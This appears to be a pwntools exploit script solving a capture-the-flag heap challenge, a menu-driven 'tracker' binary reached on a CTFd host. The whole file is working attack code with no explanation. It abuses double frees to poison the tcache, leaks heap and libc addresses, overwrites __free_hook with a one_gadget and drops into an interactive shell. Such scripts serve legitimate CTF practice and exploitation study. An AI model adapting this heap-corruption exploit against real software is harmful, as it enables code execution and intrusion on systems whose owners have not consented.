#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tilix', '--maximize', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')
libc = ELF('libc.so.6')
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30252)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def option(choice):
    io.sendlineafter("> ", str(choice))

def add():
    option(1)

def edit(idx, content):
    option(2)
    io.sendlineafter("Tracker tracker number?\n", str(idx))
    io.recvline()
    io.sendline(content)

def delete(idx):
    option(3)
    io.sendline(str(idx))

def show():
    option(4)
    print(hexdump(io.recvuntil(">")))

io = start()

add()               #1
add()               #2
delete(1)
delete(2)
edit(1, p64(0x404040 + 24))
add()               #3
add()               #4
add()               #5
edit(5, p64(0x403fc0))
option(4)
io.recvuntil("----------------------\n3) ")
heap_leak = (io.recvline().strip("\n")).ljust(8, "\x00")
heap_leak = u64(heap_leak)
heap_base = heap_leak - 0x1270
log.info("Heap Base : %s " % hex(heap_base))
log.info("Heap leak : %s " % hex(heap_leak))
io.recvuntil("4) ")

leak = (io.recvline().strip("\n")).ljust(8, "\x00")
leak = u64(leak)
log.info("Libc leaks : %s " % hex(leak))
libc.address = leak - libc.sym['malloc']
log.info("Libc base : %s " % hex(libc.address))
malloc_hook = libc.sym['__malloc_hook']
free_hook = libc.sym['__free_hook']
one_shot = libc.address + 0x4f322
log.info("Malloc Hook : %s " % hex(malloc_hook))
top_chunk = heap_base + 0x1300
log.info("Top chunk : %s " % hex(top_chunk))

edit(1, p64(free_hook))
add() #6
add() #7
edit(7, p64(one_shot))
delete(3)
io.interactive()
